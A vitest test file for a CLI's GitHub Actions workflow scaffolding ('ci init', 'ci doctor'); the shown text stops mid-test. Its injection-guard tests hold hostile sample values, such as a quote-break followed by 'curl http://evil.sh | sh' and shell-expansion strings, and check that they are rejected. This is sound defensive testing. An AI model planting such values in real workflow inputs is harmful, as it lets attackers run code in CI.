import type { SpawnSyncReturns } from 'node:child_process';
import { mkdtempSync, readFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, sep } from 'node:path';
import { Command } from 'commander';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import {
  buildGithubWorkflow,
  createCiCommand,
  CI_DEPRECATION_NOTICES,
  parseTimeoutSeconds,
  renderCiInitText,
  runCiConnect,
  runCiDoctor,
  runCiInit,
  type CiDeps,
  type CiDoctorOptions,
  type CiFs,
  type CiInitOptions,
  type CiInitSummary,
  type SpawnImpl,
} from './ci.js';
import { ApiError } from '../lib/errors.js';
import { takeTelemetryExtras } from '../lib/telemetry.js';

// ── harness ──────────────────────────────────────────────────────────────────

function makeFetch(
  handler: (url: string, init: RequestInit) => { status?: number; body: unknown },
): typeof globalThis.fetch {
  return (async (input: string | URL | Request, init: RequestInit = {}) => {
    const url =
      typeof input === 'string'
        ? input
        : input instanceof URL
          ? input.toString()
          : (input as { url: string }).url;
    const { status = 200, body } = handler(url, init);
    return new Response(JSON.stringify(body), {
      status,
      headers: { 'content-type': 'application/json' },
    });
  }) as typeof globalThis.fetch;
}

function makeCreds(apiKey = 'sk-user-test', apiUrl = 'http://localhost:13599') {
  return { TESTSPRITE_API_KEY: apiKey, TESTSPRITE_API_URL: apiUrl } as NodeJS.ProcessEnv;
}

/** In-memory fs seam: exclusive writes throw EEXIST, matching the real O_EXCL. */
function makeFakeFs(seed: Record<string, string> = {}): CiFs & { files: Map<string, string> } {
  const files = new Map<string, string>(Object.entries(seed));
  return {
    files,
    async lstat(target) {
      if (files.has(target)) return { isFile: true, isSymbolicLink: false };
      if ([...files.keys()].some(file => file.startsWith(`${target}${sep}`))) {
        return { isFile: false, isSymbolicLink: false };
      }
      return null;
    },
    async realpath(target) {
      return target;
    },
    async writeFile(target, data, opts) {
      if (opts?.exclusive && files.has(target)) {
        const err = new Error('EEXIST') as NodeJS.ErrnoException;
        err.code = 'EEXIST';
        throw err;
      }
      files.set(target, data);
    },
    async mkdir() {
      /* recursive mkdir is a no-op in memory */
    },
    async readFile(target) {
      const v = files.get(target);
      if (v === undefined) {
        const err = new Error('ENOENT') as NodeJS.ErrnoException;
        err.code = 'ENOENT';
        throw err;
      }
      return v;
    },
    async readdir(dir) {
      // Platform separator, so the seam behaves the same on Windows runners.
      const prefix = dir.endsWith(sep) ? dir : `${dir}${sep}`;
      const names = [...files.keys()]
        .filter(k => k.startsWith(prefix) && !k.slice(prefix.length).includes(sep))
        .map(k => k.slice(prefix.length));
      if (names.length === 0) {
        const err = new Error('ENOENT') as NodeJS.ErrnoException;
        err.code = 'ENOENT';
        throw err;
      }
      return names;
    },
  };
}

function spawnResult(over: Partial<SpawnSyncReturns<string>> = {}): SpawnSyncReturns<string> {
  return { pid: 1, output: [], stdout: '', stderr: '', status: 0, signal: null, ...over };
}

/** Hermetic spawn: `git symbolic-ref` → origin/main, everything else → ok. Keeps
 * unit tests off real `git`/`gh` subprocesses. */
const noopSpawn: SpawnImpl = cmd =>
  cmd === 'git' ? spawnResult({ stdout: 'origin/main\n' }) : spawnResult();

function collect() {
  const out: string[] = [];
  const err: string[] = [];
  return {
    out,
    err,
    stdout: (l: string) => out.push(l),
    stderr: (l: string) => err.push(l),
    json: () => JSON.parse(out.join('\n')),
  };
}

const base = {
  profile: 'default',
  output: 'json' as const,
  endpointUrl: undefined,
  debug: false,
  verbose: false,
  dryRun: false,
  requestTimeoutMs: undefined,
};

function opts(over: Partial<CiInitOptions> = {}): CiInitOptions {
  return {
    ...base,
    platform: 'github',
    workflowPath: '.github/workflows/testsprite.yml',
    force: false,
    setSecret: false,
    ...over,
  };
}

function projectsBody(ids: string[], nextToken: string | null = null) {
  return { items: ids.map(id => ({ id, name: id, type: 'frontend' })), nextToken };
}

/** `GET /projects/:id/env` body: `default` is the default unless told otherwise. */
function envsBody(
  names: string[] = ['default', 'staging'],
  defaultName: string | null = 'default',
) {
  return {
    environments: names.map(name => ({
      id: `env-${name}`,
      name,
      url: `https://${name}.example.com`,
      isDefault: name === defaultName,
      authMode: 'account',
    })),
  };
}

/** Answers the two reads `ci init` makes: the project list and the env list. */
function initFetch(
  over: { projects?: unknown; envs?: unknown; seen?: string[] } = {},
): typeof globalThis.fetch {
  return makeFetch(url => {
    over.seen?.push(url);
    if (/\/projects\/[^/?]+\/env/.test(url)) return { body: over.envs ?? envsBody() };
    return { body: over.projects ?? projectsBody(['only-proj']) };
  });
}

const WF = join('/repo', '.github/workflows/testsprite.yml');

/** Base deps for a runCiInit call: in-memory fs, hermetic spawn, /repo cwd. */
function deps(over: Partial<CiDeps> = {}): CiDeps {
  return {
    env: makeCreds(),
    fs: makeFakeFs(),
    fetchImpl: initFetch(),
    spawn: noopSpawn,
    cwd: '/repo',
    stdout: () => {},
    stderr: () => {},
    ...over,
  };
}

// ── buildGithubWorkflow (CLI-direct `ci run`, one template for both shapes) ───

const WF_BASE = {
  projectId: 'proj-1',
  environment: 'staging',
  workflowPath: '.github/workflows/testsprite.yml',
};

describe('buildGithubWorkflow', () => {
  it('matches the reviewed template (default flags)', () => {
    expect(buildGithubWorkflow(WF_BASE)).toMatchSnapshot();
  });

  it('matches the reviewed template with --timeout and a non-default endpoint', () => {
    expect(
      buildGithubWorkflow({
        ...WF_BASE,
        timeoutSeconds: 1800,
        endpointUrl: 'https://selfhosted.example:8443',
      }),
    ).toMatchSnapshot();
  });

  it('calls the CLI directly with --env and the preview URL, never an action', () => {
    const yaml = buildGithubWorkflow(WF_BASE);
    expect(yaml).toContain('npm i -g @testsprite/testsprite-cli@latest');
    expect(yaml).toContain('testsprite ci run');
    expect(yaml).toContain('--project "proj-1"');
    expect(yaml).toContain('--env "staging"');
    expect(yaml).toContain('--target-url "$PREVIEW_URL"');
    expect(yaml).toContain(
      'PREVIEW_URL: ${{ steps.preview.outputs.url || github.event.deployment_status.environment_url }}',
    );
    expect(yaml).not.toMatch(/testsprite-action|uses: TestSprite\//);
    expect(yaml).not.toContain('--from');
  });

  it('has exactly one placeholder step, and it fails until replaced', () => {
    const yaml = buildGithubWorkflow(WF_BASE);
    expect(yaml.match(/# REPLACE ME/g)).toHaveLength(1);
    expect(yaml).toMatch(/- name: Get this PR's preview URL\n\s+id: preview\n/);
    expect(yaml).toMatch(
      /::error::Replace the placeholder step in \.github\/workflows\/testsprite\.yml/,
    );
    expect(yaml).toContain('exit 1');
  });

  it('guards both events: no fork or draft PRs, only successful non-production deployments', () => {
    const yaml = buildGithubWorkflow(WF_BASE);
    expect(yaml).toContain('types: [opened, synchronize, reopened, ready_for_review]');
    expect(yaml).toContain('github.event.pull_request.head.repo.full_name == github.repository');
    expect(yaml).toContain('!github.event.pull_request.draft');
    expect(yaml).toContain("github.event.deployment_status.state == 'success'");
    expect(yaml).toContain('!github.event.deployment.production_environment');
    // Vercel writes production_environment: false on production deployments.
    expect(yaml).toContain("github.event.deployment.environment != 'production'");
    expect(yaml).toContain(
      'group: testsprite-${{ github.event.pull_request.number || github.event.deployment.sha }}',
    );
  });

  it('keeps least privilege, passes GITHUB_TOKEN, and always uploads the summary', () => {
    const yaml = buildGithubWorkflow(WF_BASE);
    expect(yaml).toMatch(/permissions:\n {2}contents: read\n {2}pull-requests: read\n/);
    expect(yaml).toContain('TESTSPRITE_API_KEY: ${{ secrets.TESTSPRITE_API_KEY }}');
    expect(yaml).toContain('GITHUB_TOKEN: ${{ github.token }}');
    expect(yaml).toMatch(/if: always\(\)\n\s+uses: actions\/upload-artifact@v4/);
    expect(yaml).toContain('--summary-file testsprite-summary.json');
  });

  it('writes --timeout and the endpoint only when given, and sizes the job to fit', () => {
    const plain = buildGithubWorkflow(WF_BASE);
    expect(plain).not.toContain('--timeout');
    expect(plain).not.toContain('TESTSPRITE_API_URL');
    expect(plain).toContain('timeout-minutes: 45');
    const custom = buildGithubWorkflow({
      ...WF_BASE,
      timeoutSeconds: 3600,
      endpointUrl: 'https://selfhosted.example:8443',
    });
    expect(custom).toContain('--timeout 3600');
    expect(custom).toContain('TESTSPRITE_API_URL: "https://selfhosted.example:8443"');
    expect(custom).toContain('timeout-minutes: 75');
  });

  it('rejects values that would break or hijack the workflow YAML (injection guard)', () => {
    const evil = [
      'a\nname: pwned', // newline breaks the mapping
      'a" && curl http://evil.sh | sh #', // closes the scalar, runs a second command
      '$(id)-`whoami`', // shell expansion vectors
      '${{ secrets.TESTSPRITE_API_KEY }}', // Actions evaluates it before the job
    ];
    for (const environment of evil) {
      expect(() => buildGithubWorkflow({ ...WF_BASE, environment })).toThrow(ApiError);
    }
    expect(() => buildGithubWorkflow({ ...WF_BASE, projectId: 'a"b' })).toThrow(ApiError);
    expect(() => buildGithubWorkflow({ ...WF_BASE, endpointUrl: 'https://x`y' })).toThrow(ApiError);
  });
});

describe('renderCiInitText', () => {
  const s = (over: Partial<CiInitSummary>): CiInitSummary => ({
    platform: 'github',
    path: '.github/workflows/testsprite.yml',
    projectId: 'p',
    environment: 'staging',
    wrote: true,
    status: 'written',
    endpointUrl: null,
    endpointWarning: null,
    timeoutSeconds: null,
    otherTestspriteWorkflows: [],
    secret: { name: 'TESTSPRITE_API_KEY', attempted: false, set: false, reason: null },
    ...over,
  });

  it('renders a distinct first line for each of the three wrote states', () => {
    expect(renderCiInitText(s({ status: 'written', wrote: true }))).toContain('Wrote .github');
    expect(renderCiInitText(s({ status: 'preview', wrote: false }))).toContain(
      'Would write .github',
    );
    // The no-op case must NOT read as a dry-run preview.
    const unchanged = renderCiInitText(s({ status: 'unchanged', wrote: false }));
    expect(unchanged).toContain('already up to date');
    expect(unchanged).not.toContain('Would write');
  });

  it('names the environment and leads the next steps with the placeholder', () => {
    const text = renderCiInitText(s({}));
    expect(text).toContain('environment staging');
    expect(text).toMatch(/1\. Replace the "REPLACE ME" step/);
    expect(text).toContain('gh secret set TESTSPRITE_API_KEY');
  });
});

describe('parseTimeoutSeconds', () => {
  it('defaults, accepts a valid range, rejects out-of-range / non-integer', () => {
    expect(parseTimeoutSeconds(undefined)).toBe(600);
    expect(parseTimeoutSeconds('120')).toBe(120);
    expect(() => parseTimeoutSeconds('0')).toThrow(ApiError);
    expect(() => parseTimeoutSeconds('5000')).toThrow(ApiError);
    expect(() => parseTimeoutSeconds('x')).toThrow(ApiError);
  });
});

// ── runCiInit ────────────────────────────────────────────────────────────────

describe('runCiInit', () => {
  it('auto-resolves the project and its default environment, and writes the workflow', async () => {
    const io = collect();
    const fs = makeFakeFs();
    const seen: string[] = [];
    await runCiInit(opts(), deps({ fs, ...io, fetchImpl: initFetch({ seen }) }));
    expect(seen.some(u => /\/projects\?/.test(u))).toBe(true);
    expect(seen.some(u => u.includes('/projects/only-proj/env'))).toBe(true);
    const yaml = fs.files.get(WF);
    expect(yaml).toContain('--project "only-proj"');
    expect(yaml).toContain('--env "default"'); // the default, written by name
    expect(io.json()).toMatchObject({
      wrote: true,
      status: 'written',
      projectId: 'only-proj',
      environment: 'default',
      timeoutSeconds: null,
      path: '.github/workflows/testsprite.yml',
    });
  });

  it('explicit --project skips the project lookup but still checks the environment', async () => {
    const fs = makeFakeFs();
    const seen: string[] = [];
    await runCiInit(opts({ project: 'given-proj' }), deps({ fs, fetchImpl: initFetch({ seen }) }));
    expect(seen.every(u => u.includes('/projects/given-proj/env'))).toBe(true);
    expect(fs.files.get(WF)).toContain('--project "given-proj"');
  });

  it('--env must exist in the project (the error lists the names)', async () => {
    const fs = makeFakeFs();
    await runCiInit(opts({ project: 'p', env: 'staging' }), deps({ fs }));
    expect(fs.files.get(WF)).toContain('--env "staging"');
    await expect(
      runCiInit(opts({ project: 'p', env: 'stagng' }), deps({ fs: makeFakeFs() })),
    ).rejects.toMatchObject({
      code: 'VALIDATION_ERROR',
      details: expect.objectContaining({
        field: 'env',
        reason: expect.stringContaining('available: default, staging'),
      }),
    });
  });

  it('warns (never blocks) when the environment signs in with a recorded SSO session', async () => {
    const io = collect();
    const envs = envsBody(['default', 'sso']);
    envs.environments[1]!.authMode = 'manual';
    await runCiInit(
      opts({ project: 'p', env: 'sso' }),
      deps({ ...io, fetchImpl: initFetch({ envs }) }),
    );
    expect(io.err.join('\n')).toContain('environment "sso" signs in with a recorded SSO session');
    expect(io.json()).toMatchObject({ wrote: true, environment: 'sso' });
    const quiet = collect();
    await runCiInit(opts({ project: 'p' }), deps({ ...quiet }));
    expect(quiet.err.join('\n')).not.toContain('recorded SSO session');
  });

  it('a blank --env is a typo, not a request for the default', async () => {
    const fetchImpl = vi.fn(initFetch());
    await expect(
      runCiInit(opts({ project: 'p', env: '  ' }), deps({ fetchImpl })),
    ).rejects.toMatchObject({ code: 'VALIDATION_ERROR' });
  });

  it('no default environment and no --env → VALIDATION_ERROR naming --env', async () => {
    await expect(
      runCiInit(
        opts({ project: 'p' }),
        deps({ fetchImpl: initFetch({ envs: envsBody(['a', 'b'], null) }) }),
      ),
    ).rejects.toMatchObject({
      code: 'VALIDATION_ERROR',
      details: expect.objectContaining({
        field: 'env',
        reason: expect.stringContaining('pass --env <name>'),
      }),
    });
  });

  it('zero projects → VALIDATION_ERROR', async () => {
    await expect(
      runCiInit(opts(), deps({ fetchImpl: initFetch({ projects: projectsBody([]) }) })),
    ).rejects.toMatchObject({ code: 'VALIDATION_ERROR' });
  });

  it('more than one project (a full page or a nextToken) → VALIDATION_ERROR', async () => {
    await expect(
      runCiInit(opts(), deps({ fetchImpl: initFetch({ projects: projectsBody(['a', 'b']) }) })),
    ).rejects.toMatchObject({ code: 'VALIDATION_ERROR' });
    await expect(
      runCiInit(opts(), deps({ fetchImpl: initFetch({ projects: projectsBody(['a'], 'more') }) })),
    ).rejects.toMatchObject({ code: 'VALIDATION_ERROR' });
  });

  it('pins a non-default endpoint (from the profile) as TESTSPRITE_API_URL', async () => {
    const fs = makeFakeFs();
    await runCiInit(opts({ project: 'p' }), deps({ fs }));
    expect(fs.files.get(WF)).toContain('TESTSPRITE_API_URL: "http://localhost:13599"');
  });

  it('omits the endpoint for the default production backend', async () => {
    const fs = makeFakeFs();
    await runCiInit(
      opts({ project: 'p' }),
      deps({
        fs,
        env: makeCreds('sk-user-test', 'https://api.testsprite.com'),
      }),
    );
    expect(fs.files.get(WF)).not.toContain('TESTSPRITE_API_URL');
  });

  it('writes --timeout only when given', async () => {
    const io = collect();
    const fs = makeFakeFs();
    await runCiInit(opts({ project: 'p', timeoutSeconds: 900 }), deps({ fs, ...io }));
    expect(fs.files.get(WF)).toContain('--timeout 900');
    expect(io.json()).toMatchObject({ timeoutSeconds: 900 });
  });

  it('refuses to clobber an existing workflow without --force', async () => {
    await expect(
      runCiInit(opts({ project: 'p' }), deps({ fs: makeFakeFs({ [WF]: 'old contents' }) })),
    ).rejects.toMatchObject({ code: 'VALIDATION_ERROR' });
  });

  it('--force overwrites but keeps the previous file as .bak (the template is hand-edited)', async () => {
    const io = collect();
    const fs = makeFakeFs({ [WF]: 'old contents' });
    await runCiInit(opts({ project: 'p', force: true }), deps({ fs, ...io }));
    expect(fs.files.get(WF)).toContain('--project "p"');
    expect(fs.files.get(`${WF}.bak`)).toBe('old contents');
    expect(io.json()).toMatchObject({
      wrote: true,
      status: 'written',
      backupPath: '.github/workflows/testsprite.yml.bak',
    });
  });

  it('a byte-identical workflow is left alone and gets no .bak, with or without --force', async () => {
    const io = collect();
    const fresh = makeFakeFs();
    await runCiInit(opts({ project: 'p' }), deps({ fs: fresh, ...collect() }));
    const fs = makeFakeFs({ [WF]: fresh.files.get(WF)! });
    await runCiInit(opts({ project: 'p', force: true }), deps({ fs, ...io }));
    expect(fs.files.has(`${WF}.bak`)).toBe(false);
    expect(io.json()).toMatchObject({ wrote: false, status: 'unchanged' });
    expect(io.json()).not.toHaveProperty('backupPath');
  });

  it('honors a custom --path under .github/workflows/ (.yaml too)', async () => {
    const io = collect();
    const fs = makeFakeFs();
    await runCiInit(
      opts({ project: 'p', workflowPath: '.github/workflows/gate.yaml' }),
      deps({ fs, ...io }),
    );
    expect(fs.files.get(join('/repo', '.github/workflows/gate.yaml'))).toContain(
      'Replace the placeholder step in .github/workflows/gate.yaml',
    );
    expect(io.json()).toMatchObject({ path: '.github/workflows/gate.yaml' });
  });

  it('refuses a --path GitHub would never run, before any network call', async () => {
    const fetchImpl = vi.fn(initFetch());
    for (const workflowPath of [
      'ci/ts.yml',
      '.github/workflows/nested/ts.yml',
      '.github/workflows/ts.txt',
      '../elsewhere/.github/workflows/ts.yml',
    ]) {
      await expect(
        runCiInit(opts({ project: 'p', workflowPath }), deps({ fetchImpl })),
      ).rejects.toMatchObject({ code: 'VALIDATION_ERROR' });
    }
    expect(fetchImpl).not.toHaveBeenCalled();
  });

  it('warns (never blocks) when another workflow already runs TestSprite', async () => {
    const io = collect();
    const fs = makeFakeFs({
      [join('/repo', '.github/workflows/old.yml')]:
        'steps:\n  - uses: TestSprite/testsprite-action@v1\n',
      [join('/repo', '.github/workflows/lint.yml')]: 'steps:\n  - run: npm run lint\n',
    });
    await runCiInit(opts({ project: 'p' }), deps({ fs, ...io }));
    expect(io.err.join('\n')).toContain('.github/workflows/old.yml already runs TestSprite');
    expect(io.json()).toMatchObject({
      wrote: true,
      otherTestspriteWorkflows: ['.github/workflows/old.yml'],
    });
  });

  it('re-running on byte-identical content is a no-op, and does not count itself', async () => {
    const io = collect();
    const fs = makeFakeFs();
    await runCiInit(opts({ project: 'p' }), deps({ fs }));
    const first = fs.files.get(WF);
    await runCiInit(opts({ project: 'p' }), deps({ fs, ...io }));
    expect(fs.files.get(WF)).toBe(first);
    expect(io.json()).toMatchObject({
      wrote: false,
      status: 'unchanged',
      otherTestspriteWorkflows: [],
    });
  });

  it('--dry-run makes no writes and no network calls, previews to stderr, still emits the summary', async () => {
    const io = collect();
    const fs = makeFakeFs();
    const fetchImpl = vi.fn(initFetch());
    await runCiInit(opts({ dryRun: true }), deps({ fs, fetchImpl, ...io }));
    expect(fs.files.size).toBe(0);
    expect(fetchImpl).not.toHaveBeenCalled();
    expect(io.err.join('\n')).toContain('[dry-run]');
    expect(io.json()).toMatchObject({
      wrote: false,
      status: 'preview',
      projectId: '<your-project-id>',
      environment: '<your-env-name>',
    });
  });

  it('--dry-run keeps an explicit --env as given', async () => {
    const io = collect();
    await runCiInit(opts({ dryRun: true, env: 'staging' }), deps({ ...io }));
    expect(io.json()).toMatchObject({ environment: 'staging' });
  });

  it('--set-secret shells out to gh with the key on STDIN (never argv) in cwd', async () => {
    const io = collect();
    const spawn = vi.fn(noopSpawn);
    await runCiInit(
      opts({ project: 'p', setSecret: true, repo: 'me/app' }),
      deps({ env: makeCreds('sk-user-secret'), spawn, ...io }),
    );
    expect(spawn).toHaveBeenCalledWith(
      'gh',
      ['secret', 'set', 'TESTSPRITE_API_KEY', '--repo', 'me/app'],
      { input: 'sk-user-secret', cwd: '/repo' },
    );
    expect(io.json()).toMatchObject({ secret: { attempted: true, set: true } });
  });

  it('--set-secret degrades (warns, still succeeds) when gh is absent', async () => {
    const io = collect();
    const spawn: SpawnImpl = () => {
      const err = new Error('spawn gh ENOENT') as NodeJS.ErrnoException;
      err.code = 'ENOENT';
      return spawnResult({ status: null, error: err });
    };
    await runCiInit(opts({ project: 'p', setSecret: true }), deps({ spawn, ...io }));
    const summary = io.json();
    expect(summary.wrote).toBe(true);
    expect(summary.secret).toMatchObject({ attempted: true, set: false });
    expect(io.err.join('\n')).toContain('gh CLI not found');
  });

  it('--set-secret degrades when gh exits non-zero (unauthenticated)', async () => {
    const io = collect();
    const spawn: SpawnImpl = () => spawnResult({ status: 1, stderr: 'gh: not logged in\n' });
    await runCiInit(opts({ project: 'p', setSecret: true }), deps({ spawn, ...io }));
    expect(io.json().secret).toMatchObject({ attempted: true, set: false });
    expect(io.err.join('\n')).toContain('gh exited 1');
  });

  it('with no resolvable API key the scaffold stops at the env lookup, before gh', async () => {
    const spawn = vi.fn(noopSpawn);
    await expect(
      runCiInit(
        opts({ project: 'p', setSecret: true }),
        deps({ env: { TESTSPRITE_API_URL: 'http://localhost:13599' }, spawn }),
      ),
    ).rejects.toBeInstanceOf(ApiError);
    expect(spawn).not.toHaveBeenCalled();
  });

  it('warns (does not fail) when the resolved endpoint is loopback / unreachable from a hosted runner', async () => {
    const io = collect();
    await runCiInit(opts({ project: 'p' }), deps({ ...io }));
    expect(io.err.join('\n')).toContain('a GitHub-hosted runner cannot reach');
    const summary = io.json();
    expect(summary.wrote).toBe(true);
    expect(summary.endpointWarning).toContain('http://localhost:13599');
  });

  it('rejects a bad --env up front, before any request', async () => {
    const fetchImpl = vi.fn(initFetch());
    await expect(
      runCiInit(opts({ env: 'a" && curl x | sh' }), deps({ fetchImpl })),
    ).rejects.toMatchObject({ code: 'VALIDATION_ERROR' });
    expect(fetchImpl).not.toHaveBeenCalled();
  });

  it('rejects an unsupported platform', async () => {
    await expect(
      runCiInit(opts({ platform: 'gitlab', project: 'p' }), deps()),
    ).rejects.toMatchObject({ code: 'VALIDATION_ERROR' });
  });
});

// ── command builder (Commander wiring) ───────────────────────────────────────

describe('createCiCommand', () => {
  function program(io: ReturnType<typeof collect>, fetchImpl: typeof globalThis.fetch) {
    const p = new Command();
    p.option('--output <mode>', 'output mode', 'text').option('--dry-run', 'preview only');
    p.addCommand(
      createCiCommand({
        fs: makeFakeFs(),
        fetchImpl,
        env: makeCreds(),
        spawn: noopSpawn,
        cwd: '/repo',
        stdout: io.stdout,
        stderr: io.stderr,
      }),
    );
    return p;
  }

  it('threads --project, --env and --timeout through the builder (dry-run, no network)', async () => {
    const io = collect();
    const fetchImpl = vi.fn(initFetch());
    await program(io, fetchImpl).parseAsync(
      [
        '--dry-run',
        '--output',
        'json',
        'ci',
        'init',
        'github',
        '--project',
        'p',
        '--env',
        'qa',
        '--timeout',
        '90',
      ],
      { from: 'user' },
    );
    expect(fetchImpl).not.toHaveBeenCalled();
    expect(io.json()).toMatchObject({
      platform: 'github',
      wrote: false,
      projectId: 'p',
      environment: 'qa',
      timeoutSeconds: 90,
    });
  });

  it('leaves timeoutSeconds null when --timeout is not given', async () => {
    const io = collect();
    await program(io, initFetch()).parseAsync(
      ['--dry-run', '--output', 'json', 'ci', 'init', 'github', '--project', 'p'],
      { from: 'user' },
    );
    expect(io.json()).toMatchObject({ timeoutSeconds: null });
  });

  it('ci doctor / ci connect are hidden from `ci --help` but still registered', () => {
    const io = collect();
    const ci = program(io, initFetch()).commands.find(c => c.name() === 'ci')!;
    const help = ci.helpInformation();
    expect(help).not.toMatch(/^\s+doctor /m);
    expect(help).not.toMatch(/^\s+connect /m);
    expect(help).toMatch(/^\s+run /m);
    expect(help).toMatch(/^\s+init /m);
    // Still registered: scripts that call them keep working.
    expect(ci.commands.map(c => c.name())).toEqual(expect.arrayContaining(['doctor', 'connect']));
  });

  it('running ci doctor / ci connect prints the deprecation notice on stderr first, then behaves as before', async () => {
    for (const [sub, notice] of [
      ['doctor', CI_DEPRECATION_NOTICES.doctor],
      ['connect', CI_DEPRECATION_NOTICES.connect],
    ] as const) {
      const io = collect();
      const p = program(io, initFetch());
      p.exitOverride();
      for (const s of p.commands) {
        s.exitOverride();
        for (const c of s.commands) c.exitOverride().configureOutput({ writeErr: () => {} });
      }
      // The fake spawn has no gh / vercel, so the command fails the way it
      // always did — the point here is the notice, and that it stays off stdout.
      await p
        .parseAsync(['ci', sub, ...(sub === 'doctor' ? ['--repo', 'o/r'] : [])], { from: 'user' })
        .catch(() => undefined);
      expect(io.err[0], `${sub}: first stderr line`).toBe(notice);
      expect(io.out.join('\n'), `${sub}: notice never on stdout`).not.toContain('[deprecated]');
    }
  });

  it('no longer accepts --filter (add it to the ci run line yourself)', async () => {
    const io = collect();
    const p = program(io, initFetch());
    p.exitOverride();
    for (const sub of p.commands) {
      sub.exitOverride();
      for (const c of sub.commands) c.exitOverride().configureOutput({ writeErr: () => {} });
    }
    await expect(
      p.parseAsync(['ci', 'init', 'github', '--project', 'p', '--filter', 'x'], { from: 'user' }),
    ).rejects.toThrow(/unknown option '--filter'/);
  });
});

// ── default node fs seam (real filesystem) ───────────────────────────────────

describe('runCiInit with the real fs seam', () => {
  let dir: string;
  afterEach(() => {
    if (dir) rmSync(dir, { recursive: true, force: true });
  });

  it('writes the workflow to a real temp dir and refuses to clobber without --force', async () => {
    dir = mkdtempSync(join(tmpdir(), 'ci-init-'));
    const io = collect();
    // No `fs` dep → exercises defaultCiFs (real writeFile/mkdir/readdir with O_EXCL).
    await runCiInit(opts({ project: 'real-fs-proj' }), {
      env: makeCreds(),
      fetchImpl: initFetch(),
      spawn: noopSpawn,
      cwd: dir,
      stdout: io.stdout,
      stderr: io.stderr,
    });
    // eslint-disable-next-line security/detect-non-literal-fs-filename -- reads this test's own mkdtempSync temp path, never user input.
    const written = readFileSync(join(dir, '.github/workflows/testsprite.yml'), 'utf8');
    expect(written).toContain('--project "real-fs-proj"');

    await expect(
      runCiInit(opts({ project: 'a-different-proj' }), {
        env: makeCreds(),
        fetchImpl: initFetch(),
        spawn: noopSpawn,
        cwd: dir,
        stdout: () => {},
        stderr: () => {},
      }),
    ).rejects.toMatchObject({ code: 'VALIDATION_ERROR' });
  });
});

// ── telemetry facts ──────────────────────────────────────────────────────────

describe('ci init telemetry facts', () => {
  beforeEach(() => {
    takeTelemetryExtras();
  });
  afterEach(() => {
    takeTelemetryExtras();
  });

  it('fresh write: platform + force + workflowExisted:false + projectResolved:auto (auto-detected)', async () => {
    await runCiInit(opts(), deps());
    expect(takeTelemetryExtras()).toEqual({
      platform: 'github',
      force: false,
      workflowExisted: false,
      projectResolved: 'auto',
    });
  });

  it('--force over an existing workflow: workflowExisted:true + projectResolved:flag', async () => {
    const fs = makeFakeFs({ [WF]: 'old contents' });
    await runCiInit(opts({ project: 'p', force: true }), deps({ fs }));
    expect(takeTelemetryExtras()).toEqual({
      platform: 'github',
      force: true,
      workflowExisted: true,
      projectResolved: 'flag',
    });
  });

  it('refused clobber (exists, no --force) still records workflowExisted:true on the error path', async () => {
    await expect(
      runCiInit(opts({ project: 'p' }), deps({ fs: makeFakeFs({ [WF]: 'old contents' }) })),
    ).rejects.toMatchObject({ code: 'VALIDATION_ERROR' });
    expect(takeTelemetryExtras()).toEqual({
      platform: 'github',
      force: false,
      workflowExisted: true,
      projectResolved: 'flag',
    });
  });

  it('--dry-run probes nothing, so workflowExisted is omitted', async () => {
    await runCiInit(opts({ dryRun: true }), deps());
    expect(takeTelemetryExtras()).toEqual({
      platform: 'github',
      force: false,
      projectResolved: 'auto',
    });
  });

  it('an unsupported platform records nothing (refused before the scaffold)', async () => {
    await expect(runCiInit(opts({ platform: 'gitlab' }), deps())).rejects.toMatchObject({
      code: 'VALIDATION_ERROR',
    });
    expect(takeTelemetryExtras()).toEqual({});
  });
});

// ── ci doctor / ci connect ───────────────────────────────────────────────────

/**
 * Deployment-linkage diagnosis. The subprocess seam means these never touch a
 * real `gh`/`git`/`npx`; each test states what those would have answered.
 */
describe('runCiDoctor', () => {
  const REPO = 'acme/storefront';

  /** `git remote get-url origin` → a GitHub URL; `gh api …/deployments` → payload. */
  function ghSpawn(deployments: unknown, over: Partial<SpawnSyncReturns<string>> = {}): SpawnImpl {
    return (cmd, args) => {
      if (cmd === 'git' && args[0] === 'remote') {
        return spawnResult({ stdout: `git@github.com:${REPO}.git\n` });
      }
      if (cmd === 'gh' && args[0] === 'api') {
        return spawnResult({ stdout: JSON.stringify(deployments), ...over });
      }
      return spawnResult();
    };
  }

  const recent = () => [
    {
      environment: 'Preview',
      created_at: new Date(Date.now() - 3_600_000).toISOString(),
      creator: { login: 'vercel[bot]' },
    },
  ];

  function doctorOpts(over: Partial<CiDoctorOptions> = {}): CiDoctorOptions {
    return { ...base, wait: false, ...over };
  }

  it('recent preview events → ok, exit 0, and the repo is read from the origin remote', async () => {
    const c = collect();
    await runCiDoctor(doctorOpts(), {
      spawn: ghSpawn(recent()),
      cwd: '/repo',
      stdout: c.stdout,
      stderr: c.stderr,
    });
    expect(c.json()).toMatchObject({ repo: REPO, status: 'linked', ok: true, error: null });
  });

  it('no events → exit 1 with the connect/push/verify steps (the silent-failure case)', async () => {
    const c = collect();
    const err = (await runCiDoctor(doctorOpts({ output: 'text' }), {
      spawn: ghSpawn([]),
      cwd: '/repo',
      stdout: c.stdout,
      stderr: c.stderr,
    }).catch((e: unknown) => e)) as ApiError;

    expect(err).toMatchObject({ exitCode: 1 });
    const text = c.out.join('\n');
    expect(text).toContain('testsprite ci connect');
    expect(text).toContain('git push');
    expect(text).toContain('ci doctor --wait');
  });

  it('production-only events → exit 1: a PR gate keys on preview deployments', async () => {
    const c = collect();
    const err = (await runCiDoctor(doctorOpts(), {
      spawn: ghSpawn([
        { environment: 'Production', created_at: new Date().toISOString(), creator: null },
      ]),
      cwd: '/repo',
      stdout: c.stdout,
      stderr: c.stderr,
    }).catch((e: unknown) => e)) as ApiError;

    expect(err).toMatchObject({ exitCode: 1 });
    expect(c.json()).toMatchObject({ status: 'production-only', ok: false, hasPreview: false });
  });

  it('a gh read failure exits 10, NOT 1 — "cannot read" is not the same verdict as "not linked"', async () => {
    const c = collect();
    const spawn: SpawnImpl = (cmd, args) => {
      if (cmd === 'git' && args[0] === 'remote') {
        return spawnResult({ stdout: `git@github.com:${REPO}.git\n` });
      }
      // gh is absent from PATH.
      return spawnResult({
        error: Object.assign(new Error('spawn gh ENOENT'), { code: 'ENOENT' }),
      });
    };
    const err = (await runCiDoctor(doctorOpts(), {
      spawn,
      cwd: '/repo',
      stdout: c.stdout,
      stderr: c.stderr,
    }).catch((e: unknown) => e)) as ApiError;

    // Reporting "not linked" here would send the user to fix the wrong thing.
    expect(err).toMatchObject({ exitCode: 10 });
